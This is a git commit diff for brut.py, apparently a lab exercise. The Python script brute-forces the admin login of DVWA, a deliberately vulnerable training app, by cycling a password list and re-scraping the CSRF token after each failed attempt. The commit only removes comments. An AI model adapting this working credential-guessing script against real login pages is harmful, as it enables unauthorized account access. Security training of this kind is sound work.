82a018b480517a008fe1d8a640d7df88ebacbbcb
Andrew1999Nikiforov <38139844+Andrew1999Nikiforov@users.noreply.github.com>
2021-10-09 12:44:23 +0300

    Update brut.py

--- L1/brut.py
+++ L1/brut.py
@@ -2,11 +2,9 @@ from sys import argv
 import requests
 from BeautifulSoup import BeautifulSoup as Soup
 
-# give our arguments more semantic friendly names
 script, filename, success_message = argv
 txt = open(filename)
 
-# set up our target, cookie and session
 url = 'http://dvwa.local/vulnerabilities/brute/'
 cookie = {'security': 'high', 'PHPSESSID':'67m60jqvdnh5c4joc3599qdm7s'}
 s = requests.Session()
@@ -29,42 +27,32 @@ def checkSuccess(html):
 
  else:
   success = True
-
-# return the brute force result
  return success
 
-# Get the intial CSRF token from the target site
 page_source = target_page.text
 soup = Soup(page_source);
 csrf_token = soup.findAll(attrs={"name": "user_token"})[0].get('value')
 
-# Display before attack
 print 'DVWA URL' + url
 print 'CSRF Token='+ csrf_token
 
-# Loop through our provided password file
 with open(filename) as f:
  print 'Running brute force attack...'
  for password in f:
-
-# Displays password tries and strips whitespace from password list  
+ 
   print 'password tryed: ' + password
   password = password.strip()
 
-  # setup the payload
   payload = {'username': 'admin', 'password': password, 'Login': 'Login', 'user_token': csrf_token}
   r = s.get(url, cookies=cookie, params=payload)
   success = checkSuccess(r.text)
 
   if not success:
-   # if it failed the CSRF token will be changed. Get the new one
    soup = Soup(r.text)
    csrf_token = soup.findAll(attrs={"name": "user_token"})[0].get('value')
   else:
-   # Success! Show the result
    print 'Password is: ' + password
    break
 
-# We failed, bummer. 
  if not success:
   print 'Brute force failed. No matches found.'
